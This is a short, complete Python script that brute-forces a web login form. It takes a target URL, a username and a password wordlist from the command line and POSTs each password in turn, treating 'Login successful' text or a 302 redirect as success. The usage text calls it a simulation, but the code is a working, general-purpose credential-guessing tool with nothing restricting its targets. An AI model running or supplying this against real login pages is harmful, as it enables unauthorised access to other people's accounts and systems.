import requests
import sys
import time

def brute_force_login(url, username, wordlist_file, username_field="username", password_field="password"):
    try:
        # Read password list
        with open(wordlist_file, "r") as file:
            passwords = file.read().splitlines()

        print(f"[+] Starting brute-force on {url} with username: {username}")
        print(f"[+] Loaded {len(passwords)} passwords from {wordlist_file}")
        print("="*50)

        for count, password in enumerate(passwords, 1):
            data = {
                username_field: username,
                password_field: password
            }

            try:
                response = requests.post(url, data=data, timeout=5)

                # Success detection (modify based on the target website's response)
                if "Login successful" in response.text or response.status_code == 302:
                    print(f"\n[✔] Password found: {password}")
                    return

                print(f"[{count}] Tried password: {password} — Failed")

            except requests.exceptions.RequestException as e:
                print(f"[!] Error during request: {e}")
                continue

        print("\n[✖] Password not found in wordlist.")

    except FileNotFoundError:
        print(f"[!] Wordlist file '{wordlist_file}' not found.")
    except Exception as e:
        print(f"[!] Unexpected error: {e}")

if __name__ == "__main__":
    if len(sys.argv) != 4:
        print("Usage: python brute_force_sim.py <target_url> <username> <wordlist_file>")
        print("Example: python brute_force_sim.py http://example.com/login admin passwords.txt")
        sys.exit(1)

    target_url = sys.argv[1]
    username = sys.argv[2]
    wordlist = sys.argv[3]

    brute_force_login(target_url, username, wordlist)
